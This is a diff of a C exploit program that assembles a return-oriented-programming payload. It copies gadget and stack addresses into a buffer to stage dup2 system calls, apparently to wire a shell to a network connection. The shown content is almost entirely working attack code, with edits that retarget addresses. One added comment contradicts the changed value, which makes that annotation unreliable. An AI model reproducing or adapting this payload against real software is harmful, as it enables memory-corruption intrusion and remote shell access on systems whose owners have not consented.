@@ -67,17 +67,17 @@ int main(void)
   char con_arg_16_seed[] = "\x10\x11\x11\x11";
   char con_arg_16_addr[] = "\x9c\x68\xbf\xbf"; // bufr + 383
 
-  // dup2 syscalls
+  // dup2 syscalls 0xbfbf671d
   char dup_arg_seed[] = "\x62\x01\x01\x01";
   // #1 
-  char dup_call_3_addr[] = "\xf8\x68\xbf\xbf"; // bufr + 475, BFBF 68F8
-  char dup_call_arg_addr[] = "\xfc\x68\xbf\xbf"; // bufr + 479, BFBF 68FC
+  char dup_call_3_addr[] = "\xf8\x68\xbf\xbf"; // bufr + 475, 
+  char dup_call_arg_addr[] = "\xfc\x68\xbf\xbf"; // bufr + 479, 
   // #2
-  char dup_call2_3_addr[] = "\x24\x6c\xbf\xbf"; //bufr + 507, BFBF 6C24
-  char dup_call2_arg_addr[] = "\x28\x6c\xbf\xbf"; //bufr + 511, BFBF 6C28
+  char dup_call2_3_addr[] = "\x18\x69\xbf\xbf"; //bufr + 507, 
+  char dup_call2_arg_addr[] = "\x1c\x69\xbf\xbf"; //bufr + 511, 
   // #3
-  char dup_call3_3_addr[] = "\x38\x69\xbf\xbf"; // bufr + 539, BFBF 6938
-  char dup_call3_arg_addr[] = "\x3c\x69\xbf\xbf"; // bufr + 543, BFBF 693C
+  char dup_call3_3_addr[] = "\x38\x69\xbf\xbf"; // bufr + 539, 
+  char dup_call3_arg_addr[] = "\x3c\x69\xbf\xbf"; // bufr + 543, 
 
 
   int i;
@@ -214,12 +214,12 @@ int main(void)
   strcpy(bufr + 403, xor_edx); // 0xbbb3bed4, edx has 0
   // pop off first arg address into ecx
   strcpy(bufr + 407, pop_ecx);  // 0xbbaa422
-  strcpy(bufr + 411, dup_call_arg_addr);
-  strcpy(bufr + 415, write_at_ecx_from_edx);
+  strcpy(bufr + 411, dup_call_arg_addr); // -> 0xbfbf68f8
+  strcpy(bufr + 415, write_at_ecx_from_edx); // 0xbbb6b87e
   // pop off second arg address into ecx
   strcpy(bufr + 419, inc_edx); //  // 0xbbb7b88a, edx has 1
   strcpy(bufr + 423, pop_ecx); // 0xbbaa422
-  strcpy(bufr + 427, dup_call2_arg_addr);
+  strcpy(bufr + 427, dup_call2_arg_addr); // -> 0xbfbf6c28
   strcpy(bufr + 431, write_at_ecx_from_edx); // 0xbbb6b87e
   // pop off third arg address into ecx
   strcpy(bufr + 435, inc_edx); //  // 0xbbb7b88a, edx has 2
